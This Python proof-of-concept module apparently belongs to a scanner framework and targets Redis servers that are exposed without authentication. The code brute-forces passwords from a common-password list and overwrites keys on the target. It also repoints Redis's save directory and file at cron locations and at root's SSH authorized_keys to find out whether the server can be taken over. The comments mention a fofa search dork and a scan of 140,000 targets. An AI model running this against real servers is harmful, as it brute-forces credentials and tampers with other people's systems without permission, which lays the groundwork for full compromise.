# coding:utf-8  
import redis, socket
from lib.core.common import url_handle, get_random_ua, gen_title
from lib.core.poc import POCBase
from lib.core.log import logwarning
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):

    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2021-06-09",  # POC创建时间
        "UpdateDate": "2021-06-09",  # POC创建时间
        "PocDesc": """
            V1:出于专注与web领域的考虑，本POC仅简单支持检测redis未授权访问而已,
            另外，redis连接比较慢，扫起来会比http要久很多，扫之前做好心理准备
            笔者尝试了写一个socket版本的POC，经多次测试对比，两种方案没有什么显著的区别，不论是耗时还是误报、漏报  
            
            V2: 全面升级，起因是在实战过程中遇到了超级多的假惊喜（各种低权限、无法get、无法set、无法save等问题），把笔者给气坏了。
            索性一步到位，直接把实战中需要的各种条件在检测阶段都搞定，并以title的形式上报漏洞，想来已经比较靠谱了。  
            虽然步骤很多，但整体速度也是相当可观的，扫了14万个目标，总共也不过花了7186秒即119分钟
        """,  # POC描述，写更新描述，没有就不写

        "name": "Redis未授权访问",  # 漏洞名称
        "VulnID": "",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Redis",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2021-06-09",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
        
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="redis"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def ssend(self, socket_object, message):
        message += "\r\n"
        socket_object.send(message.encode())
        return socket_object.recv(10240).decode()

    def _get_pwd(self, ip,port,socket_object):
        pwds = [
                '123456',
                'redis',
                'root',
                'admin',
                '12345678',
                'password',
                '1234567890',
                '888888',
                '88888888',
                'abc123!',
                '666666',
        ]
        data = self.ssend(socket_object, "info")
        if "redis_version" in data:
            return socket_object,""
        elif "Authentication" in data:
            socket_object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_object.settimeout(5)
            socket_object.connect((ip,port))
            for pwd in pwds:
                data = self.ssend(socket_object, "AUTH " + pwd)
                if "+OK" in data:
                    return socket_object,pwd
        return socket_object,False

    def _get_key(self, socket_object):
        keys = [
            "backup1",
            "backup2",
            "backup3",
            "backup4",
            "xxx",
            "xx",
        ]
        for key in keys:
            data = self.ssend(socket_object, "set {} \"Fist of Justice，Clean Network!\"".format(key))
            if "+OK" in data:
                return key

        data = self.ssend(socket_object, "keys *")
        if "-ERR" in data:
            return False
        keys = data.split("\r\n")
        lens = int(keys[0][1:])
        if lens >= 50:
            keys = keys[:100]
        for key in keys[1:]:
            if key != "" and "$" not in key:
                # 记录key的原始值
                value = self.ssend(socket_object, "get {}".format(key))
                data = self.ssend(socket_object, "set {} \"I'm fast, bear with me\"".format(key))
                if "+OK" in data:
                    # 恢复key的原始值，不能影响人家的业务嘛，事了拂衣去～
                    self.ssend(socket_object, "set {} \"{}\"".format(key, value))
                    return key
        return False

    def _verify(self):

        vuln = [False, ""]
        ip = self.host
        port = int(self.port)

        ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flag = ""
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            ss.settimeout(10)
            ss.connect((ip, port))
            ss,pwd = self._get_pwd(ip,port,ss)
            if pwd != False:
                if pwd == "":
                    flag += " 未授权访问 "
                else:
                    flag += " 弱口令：{} ".format(pwd)
                data = self.ssend(ss, "config get dir")
                if data.split("\r\n")[-2].startswith("/") != True:
                    flag += " Windows OS "
                else:
                    raw_dir = data.split("\r\n")[-2]
                    data = self.ssend(ss, "config get dbfilename")
                    raw_dbfilename = data.split("\r\n")[-2]

                    _true_key = self._get_key(ss)
                    if _true_key != False:
                        flag += " 可用key：{} ".format(_true_key)
                        data = self.ssend(ss, "config set dir /root")
                        if "OK" in data:
                            flag += " ROOT权限 "
                            crons = {
                                "/etc": "crontab",
                                "/etc/cron.d": "ctpdate.job",
                                "/var/spool/cron": "root",
                                "/var/spool/cron/crontabs": "root",
                            }
                            for dir in crons.keys():
                                data1 = self.ssend(ss, "config set dir {}".format(dir))
                                data2 = self.ssend(ss, "config set dbfilename {}".format(crons[dir]))
                                if "OK" in data1 and "OK" in data2:
                                    flag += " 可写计划任务，保存地址为：{}/{} ".format(dir, crons[dir])
                                    break
                            # break
                        data1 = self.ssend(ss,"config set dir /root/.ssh")
                        data2 = self.ssend(ss,"config set dbfilename authorized_keys")
                        if "OK" in data1 and "OK" in data2:
                            flag+=" 可写ssh公钥 "

                    # 收尾
                    self.ssend(ss, "config set dir {}".format(raw_dir))
                    self.ssend(ss, "config set dbfilename {}".format(raw_dbfilename))
                    # self.ssend(ss, "del backup10086")

        except Exception as e:
            raise e
        finally:
            vuln = [True if len(flag) != 0 else False, gen_title(flag)]
            ss.close()

        return vuln

    def _attack(self):
        return self._verify()
